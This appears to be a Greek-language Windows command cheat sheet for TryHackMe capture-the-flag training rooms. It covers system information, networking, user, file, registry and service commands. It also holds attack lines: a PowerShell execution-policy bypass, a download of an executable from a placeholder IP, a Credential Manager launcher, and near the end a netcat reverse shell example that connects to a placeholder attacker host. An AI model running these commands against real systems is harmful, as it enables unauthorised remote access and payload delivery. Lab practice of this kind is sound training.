# 🧠 TryHackMe Windows Cheat Sheet (Easy Rooms)

---

## 🖥️ Βασικές Πληροφορίες Συστήματος

```cmd
systeminfo
msinfo32
whoami
hostname
echo %USERNAME%
🌐 Δικτύωση

ipconfig
ipconfig /all
ping [IP]
tracert [IP]
netstat -ano
nslookup [domain]
🔐 Χρήστες & Δικαιώματα

net user
net user [όνομα]
net localgroup administrators
📁 Αρχεία και Εξερεύνηση

dir /a            :: Εμφάνιση και κρυφών αρχείων
dir /s [όνομα]    :: Αναδρομική αναζήτηση
cd\
cd C:\Users
type [αρχείο]
⚙️ Εκτέλεση Εργαλείων & Scripts

powershell.exe -ExecutionPolicy Bypass -File script.ps1
powershell Invoke-WebRequest -Uri http://IP/file.exe -OutFile file.exe
🪪 Κωδικοί / Credentials

rundll32.exe keymgr.dll,KRShowKeyMgr    :: Άνοιγμα Credential Manager
🔧 Task Manager / Services

tasklist
taskkill /PID [PID] /F
services.msc
🔍 Αναζήτηση και Registry

reg query HKLM
reg query HKCU
regedit        :: GUI registry editor
📑 Event Viewer (Logs)

eventvwr
🚀 Χρήσιμα Windows Shortcuts
Win + R → Run dialog

Win + E → File Explorer

Ctrl + Shift + Esc → Task Manager

Alt + Tab → Εναλλαγή παραθύρων

⚠️ Extra Tips για TryHackMe
Τα flag.txt αρχεία συνήθως βρίσκονται:

C:\Users\...\Desktop\

C:\ProgramData\

Ξεκινάς πάντα με enumeration!

Netcat για Windows είναι πολύ χρήσιμο!

Reverse Shell Example:


nc.exe -e cmd.exe [IP] [PORT]
🧪 Έτοιμος για TryHackMe Windows rooms όπως Blue, Relevant, Retro και BountyHunter!